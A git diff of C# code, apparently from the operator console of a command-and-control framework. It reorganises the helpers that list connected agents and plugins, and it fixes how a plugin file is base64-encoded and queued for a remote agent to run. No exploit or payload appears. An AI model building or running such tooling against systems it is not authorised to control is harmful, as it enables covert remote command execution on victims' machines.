@@ -99,32 +99,6 @@ _________         _________ _               ______   _______
                 }
             }
         }
-        private string[] ListClients(){
-            //Converts client list to a string array
-            //List<Agent> agents = this.listener.agents;
-            //var enum = this.listener.agents.GetEnumerator();
-            var agents = this.listener.agents;
-            string[] agentArr = new string[agents.Count];
-            int count = 0;
-            foreach (var agent in agents){
-                agentArr[count] = agent.Key;
-                count++;
-            }
-            return agentArr;
-        }
-
-        private string[] ListPlugins(){
-            //shows all plugins in the plugin folder
-            var plugins = this.listener.pluginDict;
-            string[] pluginArr = new string[plugins.Count];
-            int count = 0;
-            foreach(var plugin in plugins){
-                pluginArr[count] = plugin.Key;
-                count++;
-            }
-            return pluginArr;
-        }
-
         public int SetCommand(){
             //set a command for a client to query
             var firstprompt = AnsiConsole.Prompt(
@@ -161,7 +135,7 @@ _________         _________ _               ______   _______
                     //add plugin to command que
                     //should add the specific function to be run by the plugin
                     //but that's for later
-                    agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(thirdprompt), "plugin"});
+                    agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(this.listener.pluginDict[thirdprompt]), "plugin"});
                     Console.WriteLine("\n");
                     return 0;
                 } else {
@@ -171,13 +145,32 @@ _________         _________ _               ______   _______
             }
         }
 
-        /*
-        TODO
-        * modify console command menu option to have a sub menu for console command or plugin commnad
-        * add function to run a "SendFile" like method
-        * in the SendFile like method that is run (in the Listener class), have it base64 encode the plugin and send that to the client
-        * Client needs to be prepared for that
-        */
+        private string[] ListClients(){
+            //Converts client list to a string array
+            //List<Agent> agents = this.listener.agents;
+            //var enum = this.listener.agents.GetEnumerator();
+            var agents = this.listener.agents;
+            string[] agentArr = new string[agents.Count];
+            int count = 0;
+            foreach (var agent in agents){
+                agentArr[count] = agent.Key;
+                count++;
+            }
+            return agentArr;
+        }
+
+        private string[] ListPlugins(){
+            //shows all plugins in the plugin folder
+            var plugins = this.listener.pluginDict;
+            string[] pluginArr = new string[plugins.Count];
+            int count = 0;
+            foreach(var plugin in plugins){
+                pluginArr[count] = plugin.Key;
+                count++;
+            }
+            return pluginArr;
+        }
+
         
 
         public List<string> ViewResponses(){
